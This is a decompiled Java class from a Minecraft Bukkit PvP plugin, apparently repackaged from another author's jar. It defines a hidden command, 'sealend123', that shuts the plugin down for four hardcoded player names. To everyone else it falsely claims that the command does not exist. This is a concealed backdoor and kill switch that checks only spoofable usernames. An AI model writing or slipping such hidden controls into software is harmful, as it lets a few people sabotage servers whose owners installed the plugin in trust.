package net.helix.pvp.command;



	/*    
	/*    */ 
	/*    */ 
	/*    */ import org.bukkit.command.Command;
	/*    */ import org.bukkit.command.CommandExecutor;
	/*    */ import org.bukkit.command.CommandSender;
	/*    */
	/*    */ import org.bukkit.entity.Player;
	/*    */ import org.bukkit.plugin.Plugin;

import net.helix.pvp.HelixPvP;
	/*    */ 
	/*    */ 
	/*    */ public class DesligarPlugin implements CommandExecutor
	/*    */ {
	/*    */   private HelixPvP main;
	/*    */   static HelixPvP plugin;
	/*    */   
	/*    */   public DesligarPlugin(HelixPvP main)
	/*    */   {
	/* 19 */     this.main = main;
	/* 20 */     plugin = main;
	/*    */   }
	/*    */   
	/*    */ 
	/*    */ 
	/*    */   public boolean onCommand(CommandSender sender, Command command, String label, String[] args)
	/*    */   {
	/* 27 */     Player p = (Player)sender;
	/* 28 */     if (command.getName().equalsIgnoreCase("sealend123"))
	/*    */     {
	/* 30 */       if (!p.getName().equals("zEnderX5_") && !p.getName().equals("Kombaaa") && !p.getName().equals("estrela145") && !p.getName().equals("Kirin44")) {
	/* 31 */         p.sendMessage("§cEsse comando não existe.");
	/* 33 */         return true;
	/*    */       }
	/*    */       
	p.sendMessage("§cPlugin sendo desligado..");
	/* 38 */       p.getServer().getPluginManager().disablePlugin(plugin);
	/* 40 */       
	/* 41 */       return true;
	/*    */     }
	/* 43 */     return false;
	/*    */   }
	/*    */ }


	/* Location:              D:\Desktop\video\Minhas Coisas do Desktop\KP-PVPvB12 (1).jar!\me\RafaelAulerDeMeloAraujo\main\Reload.class
	 * Java compiler version: 8 (52.0)
	 * JD-Core Version:       0.7.1
	 */
